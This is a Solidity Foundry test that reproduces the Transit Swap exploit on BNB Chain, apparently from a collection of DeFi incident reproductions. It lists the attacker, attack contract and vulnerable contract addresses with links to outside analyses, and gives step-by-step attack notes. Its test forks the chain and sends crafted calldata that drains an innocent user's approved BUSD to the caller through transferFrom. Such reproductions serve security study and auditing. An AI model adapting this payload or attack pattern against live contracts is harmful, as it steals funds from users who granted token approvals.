// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20} from "src/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : over $21 Million
// Attacker : 0x5f0b31AA37Bce387a8b21554a8360C6B8698FbEF
// Attack Contract : https://bscscan.com/address/0x8CA8fD9C7641849A14CbF72FaF05c305B0c68a34
// Vulnerable Contract : https://bscscan.com/address/0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72
// Attack Tx : https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72 (unverified)

// @Analysis
// Twitter TransitFinance : https://twitter.com/TransitFinance/status/1576463550557483008
// Twitter SunSec : https://twitter.com/1nf0s3cpt/status/1576511552592543745
// Twitter BeosinAlert : https://twitter.com/BeosinAlert/status/1576387705076084736
// Article Numencyber : https://www.numencyber.com/transit-swap-hack-analysis/
// Article QuillAudits : https://quillaudits.medium.com/transit-finance-28-9m-exploit-analysis-quillaudits-5d8228956102
// Article SharkTeam : https://medium.com/@sharkteam/approval-and-verification-vulnerability-analysis-of-transitswap-security-incident-89cfe999a1ef
// Article Immunebytes : https://www.immunebytes.com/blog/transit-swap-exploit-oct-2-2022-detailed-analysis/

/*
    Attack steps: It's simple, but you need to study past transactions to know how to combine the call data.
    1. Incorrect owner address validation, you can input any innocent user who granted approvals to "0xed1afc8c4604958c2f38a3408fa63b32e737c428" before.
    In this case 0x1aae0303f795b6fcb185ea9526aa0549963319fc is a innocent user who has BUSD and granted approvals.
    
    2. Contract "0xed1afc8c4604958c2f38a3408fa63b32e737c428" will perform `transferFrom()` to transfer amount of innocent user to attacker.
    That's it.

    Root cause: Incorrect owner address validation. 

    Contract:
    TransitSwap: 0x8785bb8deae13783b24d7afe250d42ea7d7e9d72
    Bridge: 0x0B47275E0Fe7D5054373778960c99FD24F59ff52
    Claimtokens: 0xed1afc8c4604958c2f38a3408fa63b32e737c428
*/

contract ContractTest is Test {

    address constant TRANSIT_SWAP = 0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;
    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955); // Binance USDT

    function setUp() public {
        vm.createSelectFork("bsc", 21_816_545);
        // Adding labels to improve stack traces' readability
        vm.label(TRANSIT_SWAP, "TRANSIT_SWAP");
        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
        vm.label(0x0B47275E0Fe7D5054373778960c99FD24F59ff52, "EXPLOIT_AUX_CONTRACT");
        vm.label(0xeD1afC8C4604958C2F38a3408FA63B32E737c428, "EXPLOIT_AUX_CONTRACT_2");
        vm.label(0x1aAe0303f795b6FCb185ea9526Aa0549963319Fc, "VICTIM_EXAMPLE");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
        );

        (bool success,) = TRANSIT_SWAP.call(
            hex"006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e149600000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000"
        );
        require(success, "Exploit failed");

        emit log_named_decimal_uint(
            "[End] Attacker USDT balance after exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
        );
    }

}